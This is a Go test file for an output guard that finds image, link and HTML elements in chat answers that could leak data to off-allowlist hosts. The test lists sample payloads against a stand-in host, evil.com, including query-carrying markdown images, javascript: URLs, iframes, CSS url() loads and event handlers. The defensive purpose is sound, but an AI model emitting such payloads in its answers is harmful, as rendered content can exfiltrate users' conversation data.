// Copyright 2026 The Guard Spec Authors
// SPDX-License-Identifier: Apache-2.0

package outputguard

import (
	"bytes"
	"strings"
	"testing"
	"unicode"

	"github.com/yuin/goldmark"
	"github.com/yuin/goldmark/ast"
	"github.com/yuin/goldmark/extension"
	"github.com/yuin/goldmark/renderer"
	gmhtml "github.com/yuin/goldmark/renderer/html"
	"github.com/yuin/goldmark/text"
	"github.com/yuin/goldmark/util"
	xhtml "golang.org/x/net/html"
)

// commonMark parses markdown as GitHub does (CommonMark with the GFM
// extensions, among them bare URLs as links), the way most chat interfaces
// render an answer.
var commonMark = goldmark.New(goldmark.WithExtensions(extension.GFM))

// commonMarkHTML renders markdown as commonMark parses it, raw HTML passed on
// as a chat interface that renders it does, and bare URLs (autolinks) as
// plain text: renderedLeaks checks those apart, since a bare URL shows where
// it goes and the guard keeps most of them.
var commonMarkHTML = goldmark.New(goldmark.WithExtensions(extension.GFM),
	goldmark.WithRendererOptions(gmhtml.WithUnsafe(),
		renderer.WithNodeRenderers(util.Prioritized(plainAutoLinks{}, 100))))

type plainAutoLinks struct{}

func (plainAutoLinks) RegisterFuncs(reg renderer.NodeRendererFuncRegisterer) {
	reg.Register(ast.KindAutoLink, func(w util.BufWriter, src []byte, n ast.Node, entering bool) (ast.WalkStatus, error) {
		if entering {
			_, _ = w.Write(util.EscapeHTML(n.(*ast.AutoLink).Label(src)))
		}
		return ast.WalkContinue, nil
	})
}

// renderedLeaks parses out as a renderer would and returns the links, images,
// autolinks and HTML in it that the guard removes when they appear in an
// answer as such and that can reach a third-party host: images and links to
// an absolute URL off the allowlist (reference definitions show up as the
// links that use them), URLs of an image with a query, and HTML elements
// that link to or load from such a host (domLeaks), as a browser reads the
// rendered page or the answer taken as HTML.
func renderedLeaks(g *Guard, out string) []string {
	src := []byte(out)
	doc := commonMark.Parser().Parse(text.NewReader(src))
	var leaks []string
	_ = ast.Walk(doc, func(n ast.Node, entering bool) (ast.WalkStatus, error) {
		if !entering {
			return ast.WalkContinue, nil
		}
		switch n := n.(type) {
		case *ast.Link:
			if dest := string(n.Destination); webURL(dest) && !g.allowed(dest) {
				leaks = append(leaks, "link "+dest)
			}
		case *ast.Image:
			if dest := string(n.Destination); webURL(dest) && !g.allowed(dest) {
				leaks = append(leaks, "image "+dest)
			}
		case *ast.AutoLink:
			// An autolink with another scheme (<x:/a.png?q>) goes nowhere.
			if u := string(n.URL(src)); n.AutoLinkType == ast.AutoLinkURL && webURL(u) && isImageWithQuery(u) &&
				!g.allowed(u) {
				leaks = append(leaks, "url "+u)
			}
		}
		return ast.WalkContinue, nil
	})
	if bytes.IndexByte(src, '<') >= 0 {
		var page bytes.Buffer
		if err := commonMarkHTML.Renderer().Render(&page, src, doc); err != nil {
			return append(leaks, "render: "+err.Error())
		}
		leaks = append(leaks, domLeaks(g, page.String())...)
		// An interface may also put the answer in the page as HTML as it
		// stands, where tags CommonMark does not take as HTML count too.
		leaks = append(leaks, domLeaks(g, out)...)
	}
	return leaks
}

// domLeaks parses page as a browser does (golang.org/x/net/html: the HTML
// tokenizer and tree builder, character references decoded) and returns the
// elements that follow or load a URL off the allowlist, or a javascript:,
// vbscript: or data: URL, by an attribute (href, src, srcset, poster,
// action, ...), an inline style or <style> with url(), @import or
// image-set(), a meta refresh, an iframe's srcdoc, an SVG animation of href,
// or an event handler. Markdown images and links rendered as <img> and <a>
// are read the same way.
func domLeaks(g *Guard, page string) []string {
	root, err := xhtml.Parse(strings.NewReader(page))
	if err != nil {
		return []string{"parse: " + err.Error()}
	}
	var leaks []string
	leak := func(n *xhtml.Node, what string) {
		leaks = append(leaks, "html <"+n.Data+"> "+what)
	}
	var walk func(n *xhtml.Node)
	walk = func(n *xhtml.Node) {
		if n.Type == xhtml.ElementNode {
			tag := strings.ToLower(n.Data)
			for _, a := range n.Attr {
				key := strings.ToLower(a.Key)
				if a.Namespace == "xlink" {
					key = "xlink:" + key
				}
				switch use, list := urlAttr(tag, key); {
				case use == "srcdoc":
					leak(n, "srcdoc")
				case use != "":
					for _, u := range attrURLs(a.Val, list) {
						if leakyURL(g, u) {
							leak(n, key+"="+u)
						}
					}
				case key == "style" && cssLeaks(g, a.Val):
					leak(n, "style="+a.Val)
				case len(key) > 2 && strings.HasPrefix(key, "on") && strings.TrimSpace(a.Val) != "":
					leak(n, key)
				case tag == "meta" && key == "http-equiv" && strings.EqualFold(strings.TrimSpace(a.Val), "refresh"):
					leak(n, "refresh")
				case (tag == "set" || tag == "animate") && key == "attributename" &&
					strings.Contains(strings.ToLower(a.Val), "href"):
					leak(n, "animates href")
				}
			}
			if tag == "style" {
				var css strings.Builder
				for c := n.FirstChild; c != nil; c = c.NextSibling {
					css.WriteString(c.Data)
				}
				if cssLeaks(g, css.String()) {
					leak(n, css.String())
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(root)
	return leaks
}

// attrURLs returns the URLs in an attribute value: the value, or for a list
// (srcset, ping) each part between blanks and commas but descriptors.
func attrURLs(v string, list bool) []string {
	if !list {
		return []string{v}
	}
	var out []string
	for _, f := range strings.FieldsFunc(v, func(r rune) bool { return r == ',' || unicode.IsSpace(r) }) {
		if !isDescriptor(f) {
			out = append(out, f)
		}
	}
	return out
}

// leakyURL reports whether a browser following or loading u, an attribute
// value with its character references decoded, reaches a host off the
// allowlist or runs a script or inline document. As the URL parser does, it
// strips leading and trailing blanks and control characters and removes
// tabs and line breaks inside.
func leakyURL(g *Guard, u string) bool {
	u = strings.TrimFunc(u, func(r rune) bool { return r <= ' ' })
	u = strings.NewReplacer("\t", "", "\n", "", "\r", "").Replace(u)
	lower := strings.ToLower(u)
	for _, scheme := range []string{"javascript:", "vbscript:", "data:"} {
		if strings.HasPrefix(lower, scheme) {
			return true
		}
	}
	return webURL(u) && !g.allowed(u)
}

// cssLeaks reports whether CSS may load from a host off the allowlist:
// url() to one, @import, image-set() or image() of a web URL, or a
// backslash, which may spell any of them with an escape.
func cssLeaks(g *Guard, css string) bool {
	v := strings.ToLower(css)
	if strings.Contains(v, `\`) || strings.Contains(v, "@import") {
		return true
	}
	if (strings.Contains(v, "image-set(") || strings.Contains(v, "image(")) && strings.Contains(v, "//") {
		return true
	}
	for _, part := range strings.Split(v, "url(")[1:] {
		arg := strings.TrimSpace(part)
		if arg != "" && (arg[0] == '"' || arg[0] == '\'') {
			arg, _, _ = strings.Cut(arg[1:], arg[:1])
		} else {
			arg, _, _ = strings.Cut(arg, ")")
		}
		if leakyURL(g, arg) {
			return true
		}
	}
	return false
}

// webURL reports whether a browser reads dest as a web address of its own
// (http, https, or "//host"), rather than as a path relative to the page or
// a scheme it does not fetch: only such a URL can reach a third-party host.
// The guard removes those other links too, but a renderer may read a
// destination the guard does not see as one, such as "()(x" with
// parentheses that do not pair up, or "REDACTED:email((https://...", which
// stay on the page or go nowhere.
func webURL(dest string) bool {
	dest = strings.ToLower(strings.TrimSpace(dest))
	if len(dest) >= 2 && (dest[0] == '/' || dest[0] == '\\') && (dest[1] == '/' || dest[1] == '\\') {
		return true
	}
	return strings.HasPrefix(dest, "http:") || strings.HasPrefix(dest, "https:")
}

// guardLeaks returns the images, links, reference definitions, <img> tags and
// URLs that the guard itself would still remove from out: none may be left
// in what it produced.
func guardLeaks(s *Scanner, out string) []string {
	accepted, _ := s.spans(out, 0)
	var leaks []string
	for _, a := range accepted {
		switch a.kind {
		case KindImage, KindLink, KindURL:
			leaks = append(leaks, a.kind+" "+out[a.start:a.end])
		}
	}
	return leaks
}

// checkNoLeaks fails when what the guard made of in still holds an image,
// link or URL that the guard removes, as a renderer or the guard itself
// reads it.
func checkNoLeaks(t *testing.T, s *Scanner, in, out string) {
	t.Helper()
	if leaks := guardLeaks(s, out); len(leaks) > 0 {
		t.Fatalf("the guard would still remove %q from %q (from %q)", leaks, out, in)
	}
	if leaks := renderedLeaks(s.g, out); len(leaks) > 0 {
		t.Fatalf("rendered, %q holds %q (from %q)", out, leaks, in)
	}
}

// The checker itself: it finds what the guard removes in raw answers.
func TestRenderedLeaksChecker(t *testing.T) {
	g := propScanner(CanaryRedact).g
	for _, in := range []string{
		"![x](https://evil.com/a.png)", "[x](https://evil.com/?q=1)", "[x][r]\n\n[r]: https://evil.com/\n",
		"see https://evil.com/a.png?d=1 now", "<https://evil.com/a.png?d=1>", "www.evil.com/a.jpg?x=1",
		`<img src="https://evil.com/p.gif">`, "<p>\n<img src=https://evil.com/p.gif>\n</p>\n",
		"[REDACTED:image](https://evil.com/?q=S)", "[x](//evil.com/a)", "[x](HTTPS://evil.com)",
		`<a href="https://evil.com/?d=S">x</a>`, "<p>\n<a href=https://evil.com>x</a>\n</p>\n",
		`<a href="&#x68;ttps://evil.com/">x</a>`, `<a href="javascript:alert(1)">x</a>`, `<iframe src=//evil.com>`,
		`<div style="background:url(https://evil.com/x)">y</div>`, `<form action=https://evil.com><button>x</button></form>`,
		`<video poster="https://evil.com/p.png"></video>`, `<img srcset="https://evil.com/a.png 2x">`,
		`<svg><a xlink:href="https://evil.com/"><text>x</text></a></svg>`, "<style>p{background:url(//evil.com/x)}</style>",
		`<b onmouseover="x()">t</b>`, `<a/href=https://evil.com>x</a>`,
	} {
		if len(renderedLeaks(g, in)) == 0 {
			t.Errorf("no leak found in %q", in)
		}
	}
	for _, in := range []string{
		"[ok](https://docs.example.com/page)", "![ok](https://docs.example.com/a.png?x=1)",
		"https://evil.com/page and https://evil.com/a.png", "[REDACTED:image] [REDACTED:url]",
		"![x]\n(https://evil.com/a.png)", "[x] (https://evil.com/)", "[x](()(https://evil.com/?q=1)",
		"[x](page.html)", "[x](/a:b)",
		`<a href="https://docs.example.com/x">ok</a>`, `<b src="https://evil.com/">x</b>`, "Map<String, List<Integer>>",
		`<div style="color:red">x</div>`, `<a name="top">x</a>`,
	} {
		if leaks := renderedLeaks(g, in); len(leaks) > 0 {
			t.Errorf("%q: found %q", in, leaks)
		}
	}
}
